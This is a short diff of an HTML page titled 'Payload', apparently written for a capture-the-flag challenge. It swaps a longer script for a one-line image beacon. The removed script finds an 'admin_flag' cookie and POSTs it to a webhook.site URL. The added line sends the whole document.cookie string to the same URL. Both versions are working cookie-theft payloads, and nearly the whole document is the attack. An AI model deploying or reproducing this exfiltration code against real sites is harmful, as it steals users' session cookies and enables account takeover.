@@ -5,30 +5,9 @@
   <title>Payload</title>
 </head>
 <body>
-  <h1>Loading...</h1>
   <script>
-    window.onload = () => {
-      try {
-        // Read all cookies
-        const cookies = document.cookie.split(';').map(c => c.trim());
-        // Find admin_flag cookie
-        const adminFlagCookie = cookies.find(c => c.startsWith('admin_flag='));
-        if (adminFlagCookie) {
-          const flagValue = decodeURIComponent(adminFlagCookie.split('=')[1]);
-          // Send flag to your webhook URL
-          fetch('https://webhook.site/e190e44a-628f-4548-ad2b-ebddf8804ea2/', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ admin_flag: flagValue, url: window.location.href }),
-            mode: 'cors'
-          }).catch(e => console.error('Fetch error:', e));
-        } else {
-          console.log('admin_flag cookie not found');
-        }
-      } catch (e) {
-        console.error('Error reading cookie or sending webhook:', e);
-      }
-    };
+    new Image().src = "https://webhook.site/e190e44a-628f-4548-ad2b-ebddf8804ea2?cookie=" + encodeURIComponent(document.cookie);
   </script>
+  <h1>Loading...</h1>
 </body>
 </html>
